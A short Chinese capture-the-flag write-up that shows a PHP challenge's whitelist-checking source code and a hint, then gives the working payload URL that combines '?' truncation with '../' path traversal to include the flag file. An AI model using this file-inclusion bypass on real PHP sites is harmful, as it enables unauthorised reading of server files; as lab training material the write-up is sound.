利用路径穿越和文件包含技术获取flag。

先尝试查看`source.php`：`http://ip:port/source.php`
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

得知存在`hint.php`，查看：`http://ip:port/hint.php`
```
flag not here, and flag in ffffllllaaaagggg
```

得知FLAG文件名为`ffffllllaaaagggg`，直接利用路径穿越未成功，尝试利用文件包含。

输入以下URI，得到FLAG。
```
http://124.16.75.117:51005/index.php?file=source.php?/../../../../ffffllllaaaagggg
```
